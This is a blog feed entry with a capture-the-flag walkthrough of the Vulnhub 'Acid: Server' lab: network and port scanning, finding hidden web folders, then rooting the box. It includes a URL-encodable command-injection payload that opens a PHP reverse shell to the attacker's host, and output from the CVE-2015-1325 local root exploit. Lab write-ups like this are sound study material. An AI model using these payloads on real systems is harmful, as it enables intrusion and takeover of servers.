<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: cve-2015-1325 | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/cve-2015-1325/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2016-01-24T05:59:02-05:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Acid: Server]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server/"/>
    <updated>2015-09-03T05:36:37-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/03/vulnhub-acid-server</id>
    <content type="html"><![CDATA[<p><strong>Acid:Server</strong> is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-server,125/">here</a>.</p>

<!-- more -->


<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/138178348?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.132/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Hints stored in some pages' source code or title, otherwise dirbuster/wfuzz can be used to find hidden folders</li>
<li>Command injection vulnerability exists in <code>/Challenge/Magic_Box/command.php</code>, exploit it can obtain a reverse shell</li>
<li>Apport/Ubuntu - Local Root Race Condition exploit (CVE-2015-1325) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden folder and a page which has command injection vulnerability, analyse it with burp suite and exploit it to get a reverse shell</li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1325, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.132 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (&lt;a href="http://www.nta-monitor.com/tools/arp-scan/">http://www.nta-monitor.com/tools/arp-scan/&lt;/a>)
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.132  00:0c:29:36:7b:18   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:fb:ea:26   VMware, Inc.</span></code></pre></td></tr></table></div></figure></p>

<p>10.1.1.132 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -H -msf -p 1-65535 -Iv -T4 10.1.1.132
</span><span class='line'>adding 10.1.1.132/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:14028 -> 10.1.1.132:33447
</span><span class='line'>TCP open 10.1.1.132:33447  ttl 64
</span><span class='line'>sender statistics 291.2 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131074 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open             unknown[33447]     from 10.1.1.132  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>From the result above, TCP port 33447 has been discovered.</p>

<p>Then I run NMAP scan to probe more detail information against the opening port.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Host is up (0.00029s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>|&lt;em>http-methods: GET HEAD POST OPTIONS
</span><span class='line'>|&lt;/em>http-server-header: Apache/2.4.10 (Ubuntu)
</span><span class='line'>|_http-title: /Challenge
</span><span class='line'>MAC Address: 00:0C:29:36:7B:18 (VMware)</span></code></pre></td></tr></table></div></figure></p>

<p>I found that apache 2.4.10 is running on port 33447, and the server OS is Ubuntu Linux.</p>

<p>Then I start up the firefox to have a close look the web application and found hidden path from title or dirbuster scan or decode the password on the bottom of source code.</p>

<p>The hidden folder is <code>/Challenge</code></p>

<p>Then I keep using <code>dirbuster</code> to <code>/Challenge/</code> folder and found some pages, one of them is <code>cake.php</code> which again, the title give us the clue to another hidden folder <code>/Magic_Box</code></p>

<p>Keep running <code>dirbuster</code> to <code>/Challenge/Magic_Box</code> folder and found interesting php page <code>command.php</code> which has command injection vulnerability</p>

<p>Then by using <code>burp proxy</code> and tamper the request to exploit command injection vulnerability to get a shell, due to there is no <code>wget</code> in the target server, I use the following php command:</p>

<p>payload (the payload need to be <font color="red">URL encoded</font>):</p>

<p><code>127.0.0.1; php -r '$sock=fsockopen("10.1.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>

<p>Setting up <code>NC</code> to listen on port 4444, then send the payload to server and got a reverse shell with <code>www-data</code> limited privilege.</p>

<p>Then running some enumeration and poking around, I found the target server is Ubuntu 15.04, which is local privilege escape vulnerable to <code>CVE-2015-1325</code></p>

<p>Compile and send the exploit to target server, then run it to get ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@acid:/tmp$ ./37088
</span><span class='line'>./37088
</span><span class='line'>created /var/crash/_bin_sleep.33.crash
</span><span class='line'>crasher: my pid is 2571
</span><span class='line'>apport stopped, pid = 2572
</span><span class='line'>getting pid 2571
</span><span class='line'>current pid = 2570..5000..7500..10000..12500..15000..17500..20000..22500..25000..27500..30000..32500..2500..
</span><span class='line'>&lt;strong> child: current pid = 2571
</span><span class='line'>&lt;/strong> child: executing /bin/su
</span><span class='line'>Password: sleeping 2s..&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>checker: mode 4516
</span><span class='line'>waiting for file to be unlinked..writing to fifo
</span><span class='line'>fifo written.. wait&hellip;
</span><span class='line'>waiting for /etc/sudoers.d/core to appear..
</span><span class='line'>success&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p> / &lt;strong>&lt;em>|&lt;/em>&lt;/strong>  _ &lt;strong>   &lt;/strong> _ _ &lt;strong> &lt;/strong> &lt;em>| |&lt;/em> _   &lt;em>| | __ &lt;/em>| |&lt;em>(&lt;/em>) &lt;em>&lt;strong>  _ &lt;/strong>  &lt;/em>&lt;strong>
</span><span class='line'>| |   / _ | &lsquo;&lt;em> \ / &lt;/em>&lt;code>| '__/ _&lt;/code> | &lt;/strong>| | | | |/ &lt;em>` | __| |/ _ | &rsquo;&lt;/em> \/ &lt;strong>|
</span><span class='line'>| |&lt;/strong>| (&lt;em>) | | | | (&lt;/em>| | | | (&lt;em>| | |&lt;/em>| |&lt;em>| | | (&lt;/em>| | |&lt;em>| | (&lt;/em>) | | | _&lt;em> \
</span><span class='line'> _&lt;/em>&lt;strong>_&lt;/strong>/|&lt;em>| |&lt;/em>|_&lt;em>, |&lt;/em>|  _&lt;em>,&lt;/em>|_&lt;em>|_&lt;/em>,&lt;em>|&lt;/em>|_&lt;em>,&lt;/em>|_&lt;em>|&lt;/em>|_&lt;strong>/|&lt;em>| |&lt;/em>|&lt;/strong>&lt;em>/
</span><span class='line'>                  |&lt;/em>__/                                                 &lt;br/>
</span><span class='line'>root@acid:/tmp# cd /root
</span><span class='line'>cd /root
</span><span class='line'>root@acid:~# ls
</span><span class='line'>ls
</span><span class='line'>flag.txt
</span><span class='line'>root@acid:~# cat flag.txt
</span><span class='line'>cat flag.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Dear Hax0r,&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have successfully completed the challenge.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>I  hope you like it.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>FLAG NAME: &ldquo;Acid@Makke@Hax0r&rdquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Kind &amp; Best Regards&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>-ACID
</span><span class='line'>facebook: &lt;a href="https://facebook.com/m.avinash143">https://facebook.com/m.avinash143&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@acid:~#</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
